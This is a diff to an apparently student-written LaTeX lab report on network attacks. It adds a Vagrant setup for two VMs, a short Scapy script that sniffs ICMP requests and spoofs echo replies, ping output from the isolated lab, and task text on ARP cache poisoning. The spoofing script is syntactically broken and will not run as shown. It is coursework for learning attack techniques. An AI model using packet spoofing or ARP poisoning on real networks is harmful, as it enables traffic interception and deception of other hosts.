@@ -215,6 +215,99 @@ program should immediately send out an echo reply using the packet spoofing tech
 less of whether machine X is alive or not, the ping program will always receive a reply, indicating that X
 is alive. You need to use Scapy to do this task. In your report, you need to provide evidence to demonstrate
 that your technique works.
+\subsubsection{Task 1.4: Solution}
+To execute this task, two virtual machines need to be created. The following script is used with a Vagrantfile in order to populate virtual machines for us.
+
+The following Vagrantfile is used to spawn two virtual machines, "a" and "b"
+
+
+\begin{verbatim}
+# -*- mode: ruby -*-
+# vi: set ft=ruby :
+
+# Vagrant multi-machine sample setup
+
+$script = <<SCRIPT
+# download required packages
+apt-get -y update
+apt-get -y install git vim python-scapy
+SCRIPT
+
+BOX_IMAGE="hashicorp/precise64"
+
+
+Vagrant.configure("2") do |config|
+
+  config.vm.define :a do |a|
+    a.vm.box = BOX_IMAGE
+    a.vm.network :private_network, ip: "10.0.0.11"
+    a.vm.hostname = "a"
+  end
+
+  config.vm.define :b do |b|
+    b.vm.box = BOX_IMAGE
+    b.vm.network :private_network, ip: "10.0.0.12"
+    b.vm.hostname = "b"
+    b.vm.provider :virtualbox do |vb|
+      # more RAM
+      vb.customize ["modifyvm", :id, "--memory", "4096"]
+      # enable promiscuous mode on the public network
+      vb.customize ["modifyvm", :id, "--nicpromisc3", "allow-all"]
+    end
+  end
+
+  config.vm.provision "shell", inline: $script
+end
+\end{verbatim}
+
+With this file in any directory, run the command `vagrant up` and the machines will be populated. To ssh into machine a, run the command `vagrant ssh a`, for b you will run the command `vagrant ssh b`.
+
+The following commands are shown in machine b.
+
+
+\begin{verbatim}
+vagrant@b:/vagrant/src$ ifconfig | grep "inet addr"
+inet addr:10.0.2.15  Bcast:10.0.2.255  Mask:255.255.255.0
+inet addr:10.0.0.12  Bcast:10.0.0.255  Mask:255.255.255.0
+inet addr:127.0.0.1  Mask:255.0.0.0
+vagrant@b:/vagrant/src$ cat spoofing.py
+#!/usr/bin/python
+from scapy.all import *
+
+def print_pkt(pkt):
+pkt.show()
+a=IP(dst=pkt[IP].src)/ICMP)
+sr1(a)
+
+pkt = sniff(filter='icmp',prn=print_pkt)
+vagrant@b:/vagrant/src$
+\end{verbatim}
+
+running `sudo python /vagrant/src/spoofing.py` in machine b starts our program. On machine a, we can ping machine b and see normal ICMP response.
+
+\begin{verbatim}
+vagrant@a:~$ ping -c 1 10.0.0.12
+PING 10.0.0.12 (10.0.0.12) 56(84) bytes of data.
+64 bytes from 10.0.0.12: icmp_req=1 ttl=64 time=0.828 ms
+
+--- 10.0.0.12 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 0.828/0.828/0.828/0.000 ms
+\end{verbatim}
+
+However, with our program running in the background (and b running in promiscuous mode), we see the valid response from machines that do not exist.
+
+\begin{verbatim}
+vagrant@a:~$ ping -c 1 10.0.0.10
+PING 10.0.0.10 (10.0.0.10) 56(84) bytes of data.
+64 bytes from 10.0.0.10: icmp_req=1 ttl=64 time=1.54 ms
+
+--- 10.0.0.10 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 1.547/1.547/1.547/0.000 ms
+\end{verbatim}
+
+
 
 
 
@@ -252,7 +345,27 @@ following results is achieved in A’s ARP cache.
 \begin{verbatim}
 B’s IP address --> M’s MAC address
 \end{verbatim}
+There are many ways to conduct ARP cache poisoning attack. Students need to try the following three
+methods, and report whether each method works or not.
 
+\begin{itemize}
+	\item \textbf{Task 1A} (using ARP request). On host M, construct an ARP request packet and send to host A.
+	Check whether M’s MAC address is mapped to B’s IP address in A’s ARP cache.
+	\item \textbf{Task 1B} (using ARP reply). On host M, construct an ARP reply packet and send to host A. Check
+	whether M’s MAC address is mapped to B’s IP address in A’s ARP cache.
+	\item \textbf{Task 1C} (using ARP gratuitous message). On host M, construct an ARP gratuitous packets. ARP
+	gratuitous packet is a special ARP request packet. It is used when a host machine needs to update
+	outdated information on all the other machine’s ARP cache. The gratuitous ARP packet has the
+	following characteristics:
+	\begin{itemize} 
+		\item The source and destination IP addresses are the same, and they are the IP address of the host
+		issuing the gratuitous ARP.
+		\item The destination MAC addresses in both ARP header and Ethernet header are the broadcast MAC
+		address (ff:ff:ff:ff:ff:ff).
+		\item No reply is expected.
+		
+	\end{itemize}
+\end{itemize}
 
 
 To execute this lab, the following script is used inside a file named `VagrantFile`
@@ -297,9 +410,14 @@ $ vagrant ssh [m|a|b]
 Where you choose whether to ssh into m, a, or b.
 
 
+\subsubsection{1A}
 
 
 
+
+
+\subsubsection{1B}
+\subsubsection{1C}
 
 
 
